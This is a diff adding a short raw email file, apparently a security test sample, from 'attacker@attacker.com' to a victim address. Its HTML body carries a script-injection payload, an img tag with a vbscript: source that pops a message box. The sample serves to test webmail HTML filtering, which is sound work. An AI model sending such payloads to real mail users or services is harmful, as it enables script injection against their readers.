@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: xxxxxxxxxxxx
+To: victim@aliyun.com
+MIME-Version: 1.0
+Content-type: text/html
+
+11<img src="vbscript:msgbox(1)">11
